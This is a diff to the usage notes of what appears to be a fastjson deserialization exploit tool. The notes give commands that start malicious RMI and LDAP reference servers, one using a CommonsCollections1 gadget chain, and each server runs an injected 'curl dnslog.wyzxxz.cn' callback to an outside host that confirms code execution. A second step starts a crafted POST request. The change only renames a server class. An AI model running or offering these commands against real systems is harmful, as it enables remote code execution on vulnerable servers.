@@ -5,7 +5,7 @@
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
 2. 启动LDAP服务3
-java -cp fastjson_tool.jar LDAPRefServer 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar LDAPRefServer3 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"
 
 3. 启动LDAP服务2
 java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
@@ -41,7 +41,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar LDAPRefServer 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar LDAPRefServer3 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
